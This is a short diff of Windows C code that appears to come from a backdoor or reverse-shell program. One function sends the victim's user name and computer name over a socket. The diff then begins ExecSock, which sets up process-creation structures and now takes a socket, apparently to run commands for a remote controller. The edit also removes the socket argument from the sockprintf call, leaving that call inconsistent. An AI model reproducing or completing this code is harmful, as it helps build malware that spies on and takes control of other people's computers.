@@ -30,12 +30,12 @@ void UserPC()
 	DWORD hlen = sizeof(hostname) / sizeof(hostname[0]);
 	GetUserNameA(username, &len);
 	GetComputerNameA(hostname, &hlen);
-	sockprintf(sockfd, "%s / %s", username, hostname);
+	sockprintf( "%s / %s", username, hostname);
 
 }
 
 
-void ExecSock(void)
+void ExecSock(SOCKET sockfd)
 {
     STARTUPINFO sinfo;
 	PROCESS_INFORMATION pinfo;
